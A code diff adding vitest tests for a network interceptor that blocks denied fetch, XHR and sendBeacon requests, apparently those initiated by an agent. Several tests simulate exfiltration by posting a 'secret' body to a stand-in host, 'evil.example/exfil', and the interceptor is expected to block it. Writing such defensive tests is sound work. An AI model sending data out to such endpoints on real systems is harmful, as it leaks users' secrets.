@@ -1,6 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 import { installNetworkInterceptor } from './network-interceptor';
-import type { NetworkEvent } from './network-interceptor';
+import type { NetworkEvent, NetworkRequestMeta } from './network-interceptor';
 
 // We need to mock window.fetch and XMLHttpRequest since we're in Node
 let originalFetch: typeof globalThis.fetch;
@@ -40,6 +40,8 @@ beforeEach(() => {
   if (typeof XMLHttpRequest === 'undefined') {
     (globalThis as Record<string, unknown>).XMLHttpRequest = createMockXHR();
   }
+  // Clear accumulated calls so absolute call-count assertions are per-test.
+  (XMLHttpRequest.prototype.open as unknown as { mockClear?: () => void }).mockClear?.();
   originalXHRProto = {
     open: XMLHttpRequest.prototype.open,
   };
@@ -195,6 +197,159 @@ describe('installNetworkInterceptor', () => {
       expect(events[0].url).toBe('https://example.com/page');
     } finally {
       cleanup();
+    }
+  });
+});
+
+describe('installNetworkInterceptor — deny path', () => {
+  it('rejects a denied fetch and does NOT call the underlying fetch or observe it', async () => {
+    const events: NetworkEvent[] = [];
+    const underlying = globalThis.fetch as ReturnType<typeof vi.fn>;
+    const cleanup = installNetworkInterceptor(
+      (event) => events.push(event),
+      () => ({ blocked: true, reason: 'network-request blocked by delegation rule' }),
+    );
+
+    try {
+      await expect(
+        window.fetch('https://evil.example/exfil', { method: 'POST', body: 'secret' })
+      ).rejects.toThrow(/blocked by delegation rule/);
+      expect(underlying).not.toHaveBeenCalled(); // request never went out
+      expect(events).toHaveLength(0); // a denied request is not observed
+    } finally {
+      cleanup();
+    }
+  });
+
+  it('passes the request meta (url/method/initiator) to the decider', async () => {
+    const decide = vi.fn((_meta: NetworkRequestMeta) => ({ blocked: false, reason: '' }));
+    const cleanup = installNetworkInterceptor(() => {}, decide);
+
+    try {
+      await window.fetch('https://api.example.com/x', { method: 'PUT' });
+      expect(decide).toHaveBeenCalledTimes(1);
+      const meta = decide.mock.calls[0]?.[0];
+      expect(meta?.url).toBe('https://api.example.com/x');
+      expect(meta?.method).toBe('PUT');
+      expect(['agent', 'user', 'unknown']).toContain(meta?.initiator);
+    } finally {
+      cleanup();
+    }
+  });
+
+  it('lets an allowed fetch through and still observes it', async () => {
+    const events: NetworkEvent[] = [];
+    const underlying = globalThis.fetch as ReturnType<typeof vi.fn>;
+    const cleanup = installNetworkInterceptor(
+      (event) => events.push(event),
+      () => ({ blocked: false, reason: '' }),
+    );
+
+    try {
+      await window.fetch('https://api.example.com/ok');
+      expect(underlying).toHaveBeenCalledTimes(1);
+      expect(events).toHaveLength(1);
+    } finally {
+      cleanup();
+    }
+  });
+
+  it('fails OPEN when the decider throws (never breaks the page network)', async () => {
+    const underlying = globalThis.fetch as ReturnType<typeof vi.fn>;
+    const cleanup = installNetworkInterceptor(
+      () => {},
+      () => { throw new Error('policy bug'); },
+    );
+
+    try {
+      const res = await window.fetch('https://api.example.com/ok');
+      expect(res).toBeTruthy();
+      expect(underlying).toHaveBeenCalledTimes(1);
+    } finally {
+      cleanup();
+    }
+  });
+
+  it('skips the native XHR open() when denied, so the request cannot be sent', () => {
+    const events: NetworkEvent[] = [];
+    const cleanup = installNetworkInterceptor(
+      (event) => events.push(event),
+      () => ({ blocked: true, reason: 'blocked' }),
+    );
+
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://evil.example/exfil');
+      // The underlying native open() must not have been invoked.
+      expect(originalXHRProto.open).not.toHaveBeenCalled();
+      // No loadstart observer was attached, so a send() produces no event.
+      xhr.send('secret');
+      expect(events).toHaveLength(0);
+    } finally {
+      cleanup();
+    }
+  });
+
+  it('opens and observes a non-denied XHR normally', () => {
+    const events: NetworkEvent[] = [];
+    const cleanup = installNetworkInterceptor(
+      (event) => events.push(event),
+      () => ({ blocked: false, reason: '' }),
+    );
+
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://api.example.com/ok');
+      expect(originalXHRProto.open).toHaveBeenCalledTimes(1);
+      xhr.send();
+      expect(events).toHaveLength(1);
+      expect(events[0].url).toBe('https://api.example.com/ok');
+    } finally {
+      cleanup();
+    }
+  });
+
+  // Swap in an isolated fake navigator (the real one may be non-extensible in Node).
+  function withFakeNavigator(impl: (...a: unknown[]) => boolean): () => void {
+    const desc = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
+    Object.defineProperty(globalThis, 'navigator', {
+      value: { sendBeacon: impl },
+      configurable: true,
+      writable: true,
+    });
+    return () => {
+      if (desc) Object.defineProperty(globalThis, 'navigator', desc);
+      else delete (globalThis as Record<string, unknown>).navigator;
+    };
+  }
+
+  it('denies an agent-attributed sendBeacon (returns false, original not called)', () => {
+    const original = vi.fn(() => true);
+    const restore = withFakeNavigator(original);
+    const cleanup = installNetworkInterceptor(() => {}, () => ({ blocked: true, reason: 'blocked' }));
+
+    try {
+      const result = navigator.sendBeacon('https://evil.example/exfil', 'secret');
+      expect(result).toBe(false); // not queued — the beacon never leaves
+      expect(original).not.toHaveBeenCalled();
+    } finally {
+      cleanup();
+      restore();
+    }
+  });
+
+  it('lets a non-denied sendBeacon through', () => {
+    const original = vi.fn(() => true);
+    const restore = withFakeNavigator(original);
+    const cleanup = installNetworkInterceptor(() => {}, () => ({ blocked: false, reason: '' }));
+
+    try {
+      const result = navigator.sendBeacon('https://api.example.com/ok', 'data');
+      expect(result).toBe(true);
+      expect(original).toHaveBeenCalledTimes(1);
+    } finally {
+      cleanup();
+      restore();
     }
   });
 });
